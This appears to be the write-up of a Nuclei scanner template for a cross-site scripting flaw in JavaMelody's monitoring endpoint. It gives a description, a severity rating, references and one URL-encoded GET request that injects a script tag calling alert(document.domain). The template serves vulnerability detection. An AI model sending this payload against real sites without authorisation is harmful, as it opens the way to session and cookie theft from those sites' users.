# Nuclei Template: JavaMelody - Cross-Site Scripting
**Template ID:** java-melody-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`java-melody-xss.yaml`)

## Vulnerability Information & PoC

## Description
JavaMelody contains a cross-site scripting vulnerability via the monitoring parameter. An attacker can execute arbitrary script in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/monitoring?part=graph&graph=usedMemory%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://github.com/Hurdano/JavaMelody-XSS
- https://github.com/javamelody/javamelody/pull/555
